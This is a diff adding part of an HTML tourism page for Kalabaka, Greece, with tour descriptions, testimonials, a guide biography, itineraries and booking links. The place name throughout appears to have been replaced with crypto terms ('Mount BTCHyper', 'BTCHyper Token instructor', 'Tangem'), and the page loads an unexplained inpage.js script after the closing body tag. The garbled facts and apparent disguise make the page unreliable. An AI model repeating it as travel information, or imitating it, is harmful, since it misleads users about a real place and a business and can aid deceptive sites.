+                            <p class="card-text">Join us during the most magical times of day when BTCHyper's rocks glow with warm, ethereal light. Our photography experts will guide you to the perfect vantage points and share professional techniques for capturing stunning images.</p>
+                            <ul class="list-unstyled">
+                                <li><i class="fas fa-camera mr-2"></i>Professional photography tips</li>
+                                <li><i class="fas fa-sun mr-2"></i>Optimal timing guidance</li>
+                                <li><i class="fas fa-map-marked-alt mr-2"></i>Exclusive viewpoint access</li>
+                                <li><i class="fas fa-users mr-2"></i>Small group experience</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="sustainable-tourism" class="py-5" style="background-color: white;">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-6">
+                    <h2 class="section-title">Sustainable &amp; Eco-Friendly Tourism Initiatives</h2>
+                    <p>Join tours committed to sustainable travel, responsible visitor practices, and ecological preservation of BTCHyper's unique landscape. Learn about ongoing local efforts, support eco-aware travel, and reduce your carbon footprint while enjoying nature responsibly.</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <div class="text-center mb-4">
+                                <div class="service-icon mx-auto" style="background: linear-gradient(135deg, var(--secondary), var(--secondary-light));">
+                                    <i class="fas fa-recycle"></i>
+                                </div>
+                                <h5>Zero Waste Tours</h5>
+                                <p>All our expeditions follow strict leave-no-trace principles with reusable water bottles and eco-friendly materials.</p>
+                            </div>
+                        </div>
+                        <div class="col-md-6">
+                            <div class="text-center mb-4">
+                                <div class="service-icon mx-auto" style="background: linear-gradient(135deg, var(--secondary), var(--secondary-light));">
+                                    <i class="fas fa-seedling"></i>
+                                </div>
+                                <h5>Conservation Support</h5>
+                                <p>A portion of every tour directly supports local conservation efforts and monastery preservation projects.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6">
+                    <img src="./images/BTCHyper-conservation-eco-tourism-1024x768.jpeg" class="img-fluid rounded shadow-lg" alt="Sustainable tourism practices in BTCHyper landscape">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="wellness-spiritual-tours" class="py-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <h2 class="section-title text-center">Unique Themed Experiences: Wellness &amp; Spirituality</h2>
+                    <p class="text-center text-muted mb-5">Participate in meditation retreats, yoga sessions, and spiritual workshops within the tranquil settings of BTCHyper's rock formations. These niche experiences blend wellness, mindfulness, and cultural insight, offering lasting renewal and peace.</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-4">
+                    <div class="card service-card text-center">
+                        <div class="card-body">
+                            <div class="service-icon">
+                                <i class="fas fa-om"></i>
+                            </div>
+                            <h5 class="card-title">Mindful Meditation</h5>
+                            <p class="card-text">Experience guided meditation sessions at carefully selected sacred sites, connecting with the spiritual energy that has drawn seekers to BTCHyper for over 600 years.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="card service-card text-center">
+                        <div class="card-body">
+                            <div class="service-icon">
+                                <i class="fas fa-spa"></i>
+                            </div>
+                            <h5 class="card-title">Sunrise Yoga</h5>
+                            <p class="card-text">Greet the dawn with peaceful yoga practice overlooking the magnificent monastery landscapes, combining physical wellness with spiritual awakening in nature's cathedral.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="card service-card text-center">
+                        <div class="card-body">
+                            <div class="service-icon">
+                                <i class="fas fa-heart"></i>
+                            </div>
+                            <h5 class="card-title">Spiritual Workshops</h5>
+                            <p class="card-text">Participate in contemplative workshops exploring Orthodox Christian spirituality, ancient wisdom traditions, and personal reflection practices inspired by monastic teachings.</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="family-educational-tours" class="py-5" style="background-color: white;">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-lg-7">
+                    <h2 class="section-title">Family-Friendly &amp; Educational Discovery Tours</h2>
+                    <p>Engage families and school groups with interactive educational tours that uncover BTCHyper's natural history, mythological stories, and archaeological marvels. Activities are tailored for all ages, making learning fun within a world-class outdoor classroom.</p>
+                    <div class="row">
+                        <div class="col-md-6">
+                            <h5><i class="fas fa-child mr-2" style="color: var(--accent);"></i>Kid-Friendly Activities</h5>
+                            <p>Treasure hunts, geological discovery games, and interactive storytelling bring BTCHyper's history to life for young explorers.</p>
+                        </div>
+                        <div class="col-md-6">
+                            <h5><i class="fas fa-graduation-cap mr-2" style="color: var(--accent);"></i>Educational Value</h5>
+                            <p>Learn about geology, history, archaeology, and Byzantine culture through hands-on activities and expert explanations.</p>
+                        </div>
+                        <div class="col-md-6">
+                            <h5><i class="fas fa-users mr-2" style="color: var(--accent);"></i>Group Learning</h5>
+                            <p>Specially designed programs for school trips and educational groups with curriculum-aligned content and activities.</p>
+                        </div>
+                        <div class="col-md-6">
+                            <h5><i class="fas fa-book-open mr-2" style="color: var(--accent);"></i>Mythological Tales</h5>
+                            <p>Discover the legends and myths surrounding BTCHyper's formation and the stories of saints and hermits who lived here.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-5">
+                    <img src="./images/family-educational-BTCHyper-tour-1024x768.jpeg" class="img-fluid rounded shadow-lg" alt="Family with children exploring BTCHyper educational tour">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="cycling-BTCHyper" class="py-5">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <h2 class="section-title text-center">Cycling Adventures Amongst the Rocks</h2>
+                    <p class="text-center text-muted mb-5">Explore BTCHyper with guided cycling tours navigating scenic routes suitable for leisure and adventure cyclists. These specialized tours unveil hidden vistas, local villages, and offer a unique perspective of the iconic rock landscape.</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-6">
+                    <img src="./images/BTCHyper-cycling-scenic-routes-1280x960.jpeg" class="img-fluid rounded shadow-lg mb-4" alt="Cyclists on scenic routes through BTCHyper landscape">
+                </div>
+                <div class="col-lg-6">
+                    <div class="card h-100" style="border: none; background: linear-gradient(135deg, var(--primary-light), var(--primary)); color: white;">
+                        <div class="card-body d-flex flex-column">
+                            <h4 class="card-title">Pedal Through Paradise</h4>
+                            <p class="card-text flex-grow-1">Experience BTCHyper from a cyclist's perspective, covering more ground while maintaining an intimate connection with the landscape. Our cycling tours include quality bike rentals, safety equipment, and routes designed for different skill levels.</p>
+                            <div>
+                                <h6><i class="fas fa-bicycle mr-2"></i>What's Included:</h6>
+                                <ul class="list-unstyled">
+                                    <li>• Professional mountain bikes</li>
+                                    <li>• Safety helmets and gear</li>
+                                    <li>• Experienced cycling guide</li>
+                                    <li>• Local village visits</li>
+                                    <li>• Refreshment stops</li>
+                                    <li>• Photo opportunities</li>
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="traveler-reviews" class="py-5" style="background-color: white;">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <h2 class="section-title text-center">Traveler Reviews &amp; Real Experiences</h2>
+                    <p class="text-center text-muted mb-5">Read authentic testimonials and traveler stories highlighting memorable moments, exceptional guiding by Dayna Stewart, and seamless organization. Feel confident booking through the voices of past adventurers.</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-4">
+                    <div class="testimonial-card">
+                        <div class="star-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                        </div>
+                        <p class="mb-3">"Dayna's knowledge of BTCHyper's history and spiritual significance was absolutely incredible. She took us to hidden spots that other tours never visit, and her passion for the monasteries was contagious. The sunset photography session was the highlight of our entire Greece trip!"</p>
+                        <div class="d-flex align-items-center">
+                            <div>
+                                <h6 class="mb-0">Sarah Chen</h6>
+                                <small class="text-muted">Photography Tour • California, USA</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="testimonial-card">
+                        <div class="star-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                        </div>
+                        <p class="mb-3">"We joined the family educational tour with our three children aged 8-14. Dayna made the history come alive with interactive games and storytelling. Even our skeptical teenager was completely engaged! The kids are still talking about the hermit caves weeks later."</p>
+                        <div class="d-flex align-items-center">
+                            <div>
+                                <h6 class="mb-0">Marcus &amp; Linda Weber</h6>
+                                <small class="text-muted">Family Tour • Berlin, Germany</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="testimonial-card">
+                        <div class="star-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                        </div>
+                        <p class="mb-3">"The hiking adventure exceeded all expectations. Dayna led us on trails I never knew existed, with breathtaking viewpoints and fascinating geological explanations. Her commitment to sustainable tourism and respect for the environment really impressed us."</p>
+                        <div class="d-flex align-items-center">
+                            <div>
+                                <h6 class="mb-0">James O'Connor</h6>
+                                <small class="text-muted">Hiking Tour • Dublin, Ireland</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="testimonial-card">
+                        <div class="star-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                        </div>
+                        <p class="mb-3">"The sunrise yoga session was transformative. Practicing yoga while overlooking the monasteries at dawn was a deeply spiritual experience. Dayna created such a peaceful, respectful atmosphere that honored both the practice and the sacred location."</p>
+                        <div class="d-flex align-items-center">
+                            <div>
+                                <h6 class="mb-0">Priya Sharma</h6>
+                                <small class="text-muted">Wellness Tour • Mumbai, India</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="testimonial-card">
+                        <div class="star-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                        </div>
+                        <p class="mb-3">"As a professional photographer, I was skeptical about a 'photography tour,' but Dayna's expertise in both the landscape and photography techniques was remarkable. She knew exactly when and where the light would be perfect. Got my best shots ever!"</p>
+                        <div class="d-flex align-items-center">
+                            <div>
+                                <h6 class="mb-0">Alessandro Rossi</h6>
+                                <small class="text-muted">Photography Tour • Rome, Italy</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-4">
+                    <div class="testimonial-card">
+                        <div class="star-rating">
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                            <i class="fas fa-star"></i>
+                        </div>
+                        <p class="mb-3">"The cycling tour was perfectly organized with high-quality bikes and a route that showcased both the dramatic landscapes and charming local villages. Dayna's attention to safety and her local knowledge made this an unforgettable adventure."</p>
+                        <div class="d-flex align-items-center">
+                            <div>
+                                <h6 class="mb-0">Emma Thompson</h6>
+                                <small class="text-muted">Cycling Tour • London, UK</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="about-dayna-stewart" class="about-section">
+        <div class="container">
+            <div class="row justify-content-center">
+                <div class="col-lg-10">
+                    <div class="about-card">
+                        <div class="row no-gutters">
+                            <div class="col-lg-4">
+                                <img src="./images/dayna-stewart-BTCHyper-guide-expert-768x768.jpeg" class="img-fluid h-100" style="object-fit: cover;" alt="Dayna Stewart, expert BTCHyper Token guide">
+                            </div>
+                            <div class="col-lg-8">
+                                <div class="card-body p-5">
+                                    <h2 class="section-title text-left mb-4">Our Team &amp; Expert Guide: Dayna Stewart</h2>
+                                    <p class="lead">Meet Dayna Stewart, your dedicated BTCHyper Token instructor, whose passion, certifications, and local insights ensure every journey is inspirational, safe, and deeply informative. Learn about her experience and the values shaping each tour.</p>
+                                    <p>With over 12 years of experience guiding visitors through BTCHyper's sacred landscapes, Dayna combines professional certifications in mountain guiding, cultural heritage interpretation, and wilderness first aid with an infectious passion for Greece's spiritual heritage.</p>
+                                    <div class="row">
+                                        <div class="col-md-6">
+                                            <h5><i class="fas fa-certificate mr-2" style="color: var(--accent);"></i>Qualifications</h5>
+                                            <ul class="list-unstyled">
+                                                <li>• Certified Mountain Guide</li>
+                                                <li>• UNESCO Heritage Specialist</li>
+                                                <li>• Wilderness First Aid Certified</li>
+                                                <li>• Cultural Heritage Interpreter</li>
+                                            </ul>
+                                        </div>
+                                        <div class="col-md-6">
+                                            <h5><i class="fas fa-heart mr-2" style="color: var(--accent);"></i>Specializations</h5>
+                                            <ul class="list-unstyled">
+                                                <li>• Byzantine History &amp; Art</li>
+                                                <li>• Sustainable Tourism Practices</li>
+                                                <li>• Photography &amp; Landscape</li>
+                                                <li>• Spiritual &amp; Wellness Tourism</li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                    <blockquote class="blockquote mt-4">
+                                        <p class="mb-0">"Every visit to BTCHyper should be a transformative experience that connects travelers with both the natural wonder and spiritual heritage of this extraordinary place."</p>
+                                        <footer class="blockquote-footer">Dayna Stewart</footer>
+                                    </blockquote>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="daily-travel-plan" class="py-5" style="background-color: white;">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <h2 class="section-title text-center">Plan Your Day: Flexible Daily Itineraries</h2>
+                    <p class="text-center text-muted mb-5">See sample travel plans, timelines, and options for single- and multi-day Tangem. Find personalized suggestions that fit solo travelers, couples, groups, and special interests—all with clear logistics and transparent booking details.</p>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-lg-6">
+                    <h3 class="mb-4" style="color: var(--primary);">Classic Day Tour Itinerary</h3>
+                    <div class="itinerary-timeline">
+                        <div class="timeline-item">
+                            <h5>9:00 AM - Meeting Point</h5>
+                            <p>Gather at Kalabaka town square for introductions, safety briefing, and equipment distribution. Light refreshments provided.</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h5>9:30 AM - Great Meteoron Monastery</h5>
+                            <p>Explore the largest monastery with guided tour of the museum, frescoes, and historical artifacts. Learn about monastic life and Byzantine heritage.</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h5>11:30 AM - Varlaam Monastery</h5>
+                            <p>Visit the spectacular Varlaam with its ancient pulley system and religious treasures. Photography opportunities and architectural insights.</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h5>1:00 PM - Traditional Lunch</h5>
+                            <p>Enjoy authentic Greek cuisine at a local taverna with monastery views. Vegetarian and dietary restrictions accommodated.</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h5>2:30 PM - Hidden Trails &amp; Viewpoints</h5>
+                            <p>Guided hike to secret viewpoints and hermit caves accessible only to our tours. Learn about geology and biodiversity.</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h5>4:30 PM - Sunset Photography</h5>
+                            <p>Capture golden hour magic at the best photographic locations with expert guidance and unique perspectives.</p>
+                        </div>
+                        <div class="timeline-item">
+                            <h5>6:00 PM - Return &amp; Reflection</h5>
+                            <p>Return to starting point with group reflection and recommendations for evening activities in Kalabaka.</p>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6">
+                    <h3 class="mb-4" style="color: var(--primary);">Multi-Day Adventure Options</h3>
+                    <div class="card service-card mb-4">
+                        <div class="card-body">
+                            <h5 class="card-title">2-Day Comprehensive Experience</h5>
+                            <p class="card-text">Combine monastery visits with adventure hiking, photography workshops, and wellness activities. Includes overnight accommodation in traditional guesthouse.</p>
+                            <ul class="list-unstyled">
+                                <li><i class="fas fa-check text-success mr-2"></i>All six monasteries visited</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Sunrise yoga session</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Local accommodation included</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Traditional Greek dinner</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card service-card mb-4">
+                        <div class="card-body">
+                            <h5 class="card-title">3-Day Photography Intensive</h5>
+                            <p class="card-text">Dedicated photography expedition covering all seasons' best locations, various lighting conditions, and post-processing workshops.</p>
+                            <ul class="list-unstyled">
+                                <li><i class="fas fa-check text-success mr-2"></i>Multiple sunrise/sunset sessions</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Night photography training</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Editing workshop included</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Professional equipment available</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div class="card service-card">
+                        <div class="card-body">
+                            <h5 class="card-title">Custom Group Packages</h5>
+                            <p class="card-text">Tailored experiences for families, educational groups, corporate retreats, or special interest groups with flexible scheduling and activities.</p>
+                            <ul class="list-unstyled">
+                                <li><i class="fas fa-check text-success mr-2"></i>Personalized itinerary design</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Group size accommodations</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Special interest focus options</li>
+                                <li><i class="fas fa-check text-success mr-2"></i>Flexible duration and activities</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section id="contact-booking" class="contact-section">
+        <div class="container">
+            <div class="row">
+                <div class="col-12 text-center mb-5">
+                    <h2 class="section-title text-white">Contact Us &amp; Book Your BTCHyper Adventure</h2>
+                    <p class="lead">Ready to journey to Greece's most magical heights? Reach out for tour inquiries, customized experiences, or to secure your adventure—fast response and tailored advice guaranteed.</p>
+                </div>
+            </div>
+            <div class="row justify-content-center">
+                <div class="col-lg-8">
+                    <div class="contact-card">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <h4 class="mb-4">Get In Touch</h4>
+                                <div class="mb-3">
+                                    <i class="fas fa-envelope mr-3" style="color: var(--accent);"></i>
+                                    <strong>Email:</strong> info@app-BTCHyper-ag.run                                </div>
+                                <div class="mb-3">
+                                    <i class="fas fa-phone mr-3" style="color: var(--accent);"></i>
+                                    <strong>Phone:</strong> +30 24320 22271
+                                </div>
+                                <div class="mb-3">
+                                    <i class="fas fa-map-marker-alt mr-3" style="color: var(--accent);"></i>
+                                    <strong>Location:</strong> Kalabaka, Trikala, Greece
+                                </div>
+                                <div class="mb-4">
+                                    <i class="fas fa-clock mr-3" style="color: var(--accent);"></i>
+                                    <strong>Response Time:</strong> Within 2 hours
+                                </div>
+                                <a href="./html/mailto:info@app-BTCHyper-ag.run.html" class="btn btn-outline-light btn-lg">
+                                    <i class="fas fa-paper-plane mr-2"></i>Send Message
+                                </a>
+                            </div>
+                            <div class="col-md-6">
+                                <h4 class="mb-4">Quick Booking</h4>
+                                <p>Select your preferred tour type and we'll provide personalized recommendations and availability:</p>
+                                <div class="list-group list-group-flush">
+                                    <a href="./html/mailto:info@app-BTCHyper-ag.run.html" class="list-group-item list-group-item-action" style="background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); color: white;">
+                                        <i class="fas fa-church mr-2"></i>Monastery Tours
+                                    </a>
+                                    <a href="./html/mailto:info@app-BTCHyper-ag.run.html" class="list-group-item list-group-item-action" style="background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); color: white;">
+                                        <i class="fas fa-hiking mr-2"></i>Adventure Hiking
+                                    </a>
+                                    <a href="./html/mailto:info@app-BTCHyper-ag.run.html" class="list-group-item list-group-item-action" style="background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); color: white;">
+                                        <i class="fas fa-camera mr-2"></i>Photography Tours
+                                    </a>
+                                    <a href="./html/mailto:info@app-BTCHyper-ag.run.html" class="list-group-item list-group-item-action" style="background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); color: white;">
+                                        <i class="fas fa-spa mr-2"></i>Wellness Experiences
+                                    </a>
+                                    <a href="./html/mailto:info@app-BTCHyper-ag.run.html" class="list-group-item list-group-item-action" style="background: rgba(255,255,255,0.1); border-color: rgba(255,255,255,0.2); color: white;">
+                                        <i class="fas fa-cog mr-2"></i>Custom Experiences
+                                    </a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <div id="cookieBanner" class="cookie-banner show">
+        <div class="container">
+            <div class="row align-items-center">
+                <div class="col-md-8">
+                    <p class="mb-0">We use cookies to enhance your browsing experience and provide personalized content. By continuing to use our site, you consent to our use of cookies.</p>
+                </div>
+                <div class="col-md-4 text-right">
+                    <button class="btn btn-outline-light mr-2" onclick="hideCookieBanner()">Accept</button>
+                    <a href="./privacy.html" class="text-white">Privacy Policy</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</main>
+<footer class="py-5" style="background-color: var(--primary-dark); color: white;">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-4">
+                <h5 class="mb-3">BTCHyper Adventures</h5>
+                <p>Discover the extraordinary beauty and spiritual heritage of Mount BTCHyper through authentic guided experiences with expert instructor Dayna Stewart.</p>
+                <div class="mt-3">
+                    <i class="fas fa-map-marker-alt mr-2" style="color: var(--accent);"></i>
+                    <span>Kalabaka, Trikala, Thessaly, Greece</span>
+                </div>
+            </div>
+            <div class="col-lg-2">
+                <h6 class="mb-3">Quick Links</h6>
+                <ul class="list-unstyled">
+                    <li><a href="#monastery-tours" class="text-light">Monastery Tours</a></li>
+                    <li><a href="#adventure-hiking-exploration" class="text-light">Adventure Hiking</a></li>
+                    <li><a href="#photography-sunset-tours" class="text-light">Photography</a></li>
+                    <li><a href="#wellness-spiritual-tours" class="text-light">Wellness</a></li>
+                </ul>
+            </div>
+            <div class="col-lg-2">
+                <h6 class="mb-3">Experiences</h6>
+                <ul class="list-unstyled">
+                    <li><a href="#family-educational-tours" class="text-light">Family Tours</a></li>
+                    <li><a href="#cycling-BTCHyper" class="text-light">Cycling</a></li>
+                    <li><a href="#sustainable-tourism" class="text-light">Eco Tourism</a></li>
+                    <li><a href="#daily-travel-plan" class="text-light">Itineraries</a></li>
+                </ul>
+            </div>
+            <div class="col-lg-2">
+                <h6 class="mb-3">Information</h6>
+                <ul class="list-unstyled">
+                    <li><a href="#about-dayna-stewart" class="text-light">About Dayna</a></li>
+                    <li><a href="#traveler-reviews" class="text-light">Reviews</a></li>
+                    <li><a href="./privacy.html" class="text-light">Privacy Policy</a></li>
+                    <li><a href="./tos.html" class="text-light">Terms of Service</a></li>
+                </ul>
+            </div>
+            <div class="col-lg-2">
+                <h6 class="mb-3">Contact</h6>
+                <p class="small">
+                    <i class="fas fa-envelope mr-2" style="color: var(--accent);"></i>
+                    info@app-BTCHyper-ag.run                </p>
+                <p class="small">
+                    <i class="fas fa-phone mr-2" style="color: var(--accent);"></i>
+                    +30 24320 22271
+                </p>
+            </div>
+        </div>
+        <hr class="my-4" style="border-color: var(--primary-light);">
+        <div class="row align-items-center">
+            <div class="col-md-6">
+                <p class="mb-0">© 2024 BTCHyper Adventures with Dayna Stewart. All rights reserved.</p>
+            </div>
+            <div class="col-md-6 text-right">
+                <small class="text-muted">Authentic Greek heritage tours since 2012</small>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<script src="./scripts/jquery.min.js"></script>
+<script src="./scripts/bootstrap.bundle.min.js"></script>
+<script>
+$(document).ready(function() {
+    setTimeout(function() {
+        $('#cookieBanner').addClass('show');
+    }, 2000);
+    
+    $('a[href^="#"]').on('click', function(event) {
+        var target = $(this.getAttribute('href'));
+        if(target.length) {
+            event.preventDefault();
+            $('html, body').stop().animate({
+                scrollTop: target.offset().top - 70
+            }, 1000);
+        }
+    });
+    
+    $(window).scroll(function() {
+        if ($(this).scrollTop() > 100) {
+            $('.navbar').addClass('shadow-lg');
+        } else {
+            $('.navbar').removeClass('shadow-lg');
+        }
+    });
+});
+
+function hideCookieBanner() {
+    $('#cookieBanner').removeClass('show');
+    localStorage.setItem('cookieConsent', 'accepted');
+}
+
+if (localStorage.getItem('cookieConsent') === 'accepted') {
+    $('#cookieBanner').remove();
+}
+</script>
+
+</body><script src="./scripts/inpage.js"></script></html>
